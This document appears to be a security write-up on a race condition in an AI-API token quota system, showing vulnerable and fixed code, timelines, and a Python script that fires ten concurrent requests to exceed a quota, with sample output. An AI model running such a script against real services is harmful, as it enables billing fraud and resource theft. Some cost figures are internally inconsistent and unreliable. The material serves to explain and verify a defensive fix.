# Race Condition Attack Example - Before and After Fix

## Scenario Setup

**User Configuration:**
- User ID: 1
- Token Limit: 1,000 tokens/month
- Current Usage: 0 tokens
- Tier: Starter

**Attack:**
- Sends 10 concurrent API requests
- Each request requires ~500 tokens
- Goal: Consume 5,000 tokens despite 1,000 limit

---

## BEFORE FIX (VULNERABLE) - Timeline Analysis

### Request Timeline

```
Time (ms)    Request 1    Request 2    Request 3    ...    Request 10
────────────────────────────────────────────────────────────────────────
0            START        START        START        ...    START
             │            │            │                   │
5            CHECK QUOTA  CHECK QUOTA  CHECK QUOTA  ...    CHECK QUOTA
             (0/1000)     (0/1000)     (0/1000)            (0/1000)
             PASS ✓       PASS ✓       PASS ✓              PASS ✓
             │            │            │                   │
10           START API    START API    START API    ...    START API
             │            │            │                   │
1000         API DONE     API DONE     API DONE     ...    API DONE
             (500 tokens) (500 tokens) (500 tokens)        (500 tokens)
             │            │            │                   │
1005         DEDUCT 500   DEDUCT 500   DEDUCT 500   ...    DEDUCT 500
             │            │            │                   │
FINAL USAGE: 5,000 tokens (5x quota limit) 🚨 VULNERABILITY 🚨
```

### Detailed Execution Trace

**Step 1: All requests check quota simultaneously**
```sql
-- Request 1 (ms: 0-5)
SELECT tokens_used_period FROM user_quota WHERE user_id = 1;
-- Returns: 0  (CHECK PASSES ✓)

-- Request 2 (ms: 0-5) [CONCURRENT]
SELECT tokens_used_period FROM user_quota WHERE user_id = 1;
-- Returns: 0  (CHECK PASSES ✓)

-- Request 3 (ms: 0-5) [CONCURRENT]
SELECT tokens_used_period FROM user_quota WHERE user_id = 1;
-- Returns: 0  (CHECK PASSES ✓)

... [Requests 4-10 all return 0 and PASS]
```

**Step 2: All requests execute API calls (1-30 seconds)**
```
All 10 requests proceed to call OpenAI/Anthropic/etc.
Each consumes ~500 tokens from provider.
Platform pays for all 5,000 tokens.
```

**Step 3: All requests deduct tokens after API call**
```sql
-- Request 1 completes (ms: 1005)
UPDATE user_quota SET tokens_used_period = tokens_used_period + 500 WHERE user_id = 1;
-- New value: 500

-- Request 2 completes (ms: 1006)
UPDATE user_quota SET tokens_used_period = tokens_used_period + 500 WHERE user_id = 1;
-- New value: 1000

-- Request 3 completes (ms: 1007)
UPDATE user_quota SET tokens_used_period = tokens_used_period + 500 WHERE user_id = 1;
-- New value: 1500  🚨 OVER QUOTA!

... [Requests 4-10 continue incrementing]

-- Request 10 completes (ms: 1014)
UPDATE user_quota SET tokens_used_period = tokens_used_period + 500 WHERE user_id = 1;
-- New value: 5000  🚨 5X QUOTA EXCEEDED!
```

### Attack Result
- **Expected:** 1,000 tokens consumed (quota limit)
- **Actual:** 5,000 tokens consumed (5x limit)
- **Platform Loss:** $12.50 (GPT-4o) to $75 (Claude Opus)
- **User Charged:** $29/month (Starter tier)
- **Platform Net Loss:** -$58.50 to -$46 per attack

---

## AFTER FIX (SECURE) - Timeline Analysis

### Request Timeline

```
Time (ms)    Request 1    Request 2    Request 3    ...    Request 10
────────────────────────────────────────────────────────────────────────
0            START        START        START        ...    START
             │            │            │                   │
2            RESERVE 500  │            │                   │
             Redis INCR   │            │                   │
             0→500 ✓      │            │                   │
             │            │            │                   │
3            START API    RESERVE 500  │                   │
             │            Redis INCR   │                   │
             │            500→1000 ✓   │                   │
             │            │            │                   │
4            │            START API    RESERVE 500         │
             │            │            Redis INCR          │
             │            │            1000→1500? ✗        │
             │            │            DENIED 402          │
             │            │            │                   │
5            │            │            RESPONSE: "Insufficient tokens"
             │            │            │                   │
6            │            │            │                   RESERVE 500
             │            │            │                   Redis INCR
             │            │            │                   DENIED 402 ✗
             │            │            │                   │
... (Requests 4-10 all get DENIED 402)
             │            │
1000         API DONE     │
             (actual:450) │
             │            │
1001         FINALIZE:    API DONE
             500→450      (actual:480)
             Return 50    │
             │            │
1002         │            FINALIZE:
             │            500→480
             │            Return 20
             │            │
FINAL USAGE: 930 tokens (within 1000 limit) ✅ SECURE ✅
```

### Detailed Execution Trace

**Step 1: Atomic reservation (Redis Lua script)**

**Request 1 (ms: 0-2):**
```lua
-- Redis Lua Script (ATOMIC - no interruption possible)
local quota_key = "quota:1"
local reservation_key = "token_reservation:1:abc123"
local estimated = 500
local limit = 1000

-- Read current usage
local current = redis.call('GET', quota_key) or 0  -- Returns: 0

-- Check limit
if current + estimated > limit then
    return {0, current, limit}  -- Would deny if over
end

-- ATOMICALLY increment
local new_total = redis.call('INCRBY', quota_key, estimated)  -- 0 + 500 = 500

-- Store reservation
redis.call('HMSET', reservation_key, 'estimated', 500, ...)
redis.call('EXPIRE', reservation_key, 300)

return {1, 500, 1000}  -- SUCCESS
```

**Request 2 (ms: 3-4):**
```lua
-- Request 2's Lua script executes AFTER Request 1 completes
local current = redis.call('GET', quota_key) or 0  -- Returns: 500 (updated by R1)

if current + 500 > 1000 then  -- 500 + 500 = 1000, NOT > 1000
    return {0, current, limit}
end

local new_total = redis.call('INCRBY', quota_key, 500)  -- 500 + 500 = 1000

return {1, 1000, 1000}  -- SUCCESS (last one to fit)
```

**Request 3 (ms: 4-5):**
```lua
-- Request 3's Lua script executes AFTER Request 2 completes
local current = redis.call('GET', quota_key) or 0  -- Returns: 1000

if current + 500 > 1000 then  -- 1000 + 500 = 1500 > 1000 ✗
    return {0, 1000, 1000}  -- DENIED
end
-- Never reaches INCRBY
```

**Application Code (Request 3):**
```python
success, reservation_id, current_usage = await service.reserve_tokens(
    user_id=1,
    estimated_tokens=500,
    token_limit=1000,
)
# success = False
# current_usage = 1000

if not success:
    raise HTTPException(
        status_code=402,
        detail=f"Insufficient tokens. Current usage: {current_usage} / 1000"
    )
    # Request 3 STOPS HERE - no API call made
```

**Requests 4-10:** All execute same Lua script, all see `current = 1000`, all DENIED.

**Step 2: Only 2 API calls execute**
```
Request 1: Calls OpenAI (consumes 450 actual tokens from provider)
Request 2: Calls OpenAI (consumes 480 actual tokens from provider)
Requests 3-10: Never execute (stopped at reservation)

Platform pays for: 930 tokens (within budget)
```

**Step 3: Finalize reservations**

**Request 1 Finalization:**
```lua
-- Finalization Lua Script (ATOMIC)
local reservation = redis.call('HMGET', reservation_key, 'estimated', ...)
local estimated = 500
local actual = 450
local difference = actual - estimated  -- 450 - 500 = -50

-- Adjust quota (negative = return tokens)
redis.call('INCRBY', quota_key, difference)  -- 1000 + (-50) = 950

-- Delete reservation
redis.call('DEL', reservation_key)

return {1, 950, -50}  -- Returned 50 tokens to pool
```

**Request 2 Finalization:**
```lua
local estimated = 500
local actual = 480
local difference = -20

redis.call('INCRBY', quota_key, -20)  -- 950 + (-20) = 930

return {1, 930, -20}  -- Returned 20 tokens to pool
```

### Fix Result
- **Expected:** 1,000 tokens consumed (quota limit)
- **Actual:** 930 tokens consumed (70 tokens returned)
- **Platform Cost:** $0.465 (GPT-4o) to $2.79 (Claude Opus)
- **User Charged:** $29/month (Starter tier)
- **Platform Net Profit:** +$26.21 to +$28.535 ✅
- **Requests Denied:** 8 out of 10 (proper enforcement)

---

## Side-by-Side Comparison

| Metric | Before Fix (VULNERABLE) | After Fix (SECURE) |
|--------|-------------------------|-------------------|
| Requests Allowed | 10 / 10 | 2 / 10 |
| Tokens Consumed | 5,000 | 930 |
| Quota Exceeded By | 4,000 (400%) | 0 (0%) |
| Platform Cost | $12.50 - $75 | $0.47 - $2.79 |
| Financial Loss | -$58.50 to -$46 | +$26.21 to +$28.54 |
| Attack Success | ✅ Successful | ❌ Prevented |
| Race Condition | ✅ Exploitable | ❌ Eliminated |

---

## Key Technical Differences

### Database Operations (Before Fix)

**Non-Atomic:**
```python
# Step 1: Check (separate operation)
quota = await db.execute(
    select(UserQuota).where(UserQuota.user_id == user_id)
)

# Step 2: Validate (local)
if quota.tokens_used >= quota.token_limit:
    raise HTTPException(402)

# ⚠️ RACE CONDITION WINDOW HERE (1-30 seconds) ⚠️
# Other requests can pass check in parallel

# Step 3: API Call
response = await provider.chat_completion(...)

# Step 4: Update (separate operation, AFTER usage)
quota.tokens_used += response.total_tokens
await db.commit()
```

**Problem:** Steps 1-4 are NOT atomic. Multiple requests can pass step 2 simultaneously.

### Redis Operations (After Fix)

**Atomic:**
```python
# Step 1: Reserve (ATOMIC via Lua script)
success, reservation_id, usage = await service.reserve_tokens(
    user_id=user_id,
    estimated_tokens=estimated,
    token_limit=limit,
)
# Inside Lua: check AND increment happen atomically
# No other request can execute between check and increment

if not success:
    raise HTTPException(402)  # Denied BEFORE API call

# Step 2: API Call (quota already updated)
response = await provider.chat_completion(...)

# Step 3: Finalize (ATOMIC via Lua script)
await service.finalize_reservation(
    user_id=user_id,
    reservation_id=reservation_id,
    actual_tokens=response.total_tokens,
)
```

**Solution:** Lua script ensures check-and-increment is ONE atomic operation in Redis.

---

## Attack Script Example

### Attacker's Code (Works on VULNERABLE version)

```python
import asyncio
import aiohttp

async def exploit_race_condition():
    """Exploit race condition to consume 5x quota."""
    token = "user_jwt_token_here"
    headers = {"Authorization": f"Bearer {token}"}

    payload = {
        "provider": "openai",
        "model": "gpt-4o",
        "messages": [{"role": "user", "content": "Write 500 words"}],
        "max_tokens": 600  # ~500 tokens per request
    }

    async def make_request(session, num):
        async with session.post(
            "http://api.example.com/ai/chat",
            headers=headers,
            json=payload
        ) as resp:
            print(f"Request {num}: {resp.status}")
            return await resp.json()

    # Send 10 concurrent requests
    async with aiohttp.ClientSession() as session:
        tasks = [make_request(session, i) for i in range(10)]
        results = await asyncio.gather(*tasks)

    # Count successes
    successes = [r for r in results if "content" in r]
    print(f"Successes: {len(successes)}/10")
    print(f"Expected tokens used: {len(successes) * 500}")

# Run attack
asyncio.run(exploit_race_condition())
```

**Output on VULNERABLE version:**
```
Request 0: 200
Request 1: 200
Request 2: 200
Request 3: 200
Request 4: 200
Request 5: 200
Request 6: 200
Request 7: 200
Request 8: 200
Request 9: 200
Successes: 10/10
Expected tokens used: 5000
🚨 ATTACK SUCCESSFUL - Consumed 5x quota!
```

**Output on FIXED version:**
```
Request 0: 200
Request 1: 200
Request 2: 402 (Insufficient tokens)
Request 3: 402 (Insufficient tokens)
Request 4: 402 (Insufficient tokens)
Request 5: 402 (Insufficient tokens)
Request 6: 402 (Insufficient tokens)
Request 7: 402 (Insufficient tokens)
Request 8: 402 (Insufficient tokens)
Request 9: 402 (Insufficient tokens)
Successes: 2/10
Expected tokens used: 930 (after finalization)
✅ ATTACK PREVENTED - Quota enforced correctly!
```

---

## Conclusion

The atomic token reservation system **completely eliminates** the race condition vulnerability by ensuring the check-and-reserve operation is atomic at the Redis level. No matter how many concurrent requests are sent, the quota is enforced correctly.

**Key Takeaway:** Moving from a two-step check-then-update pattern (TOCTOU vulnerable) to an atomic check-and-update pattern (TOCTOU immune) is the ONLY secure solution for this class of race condition.
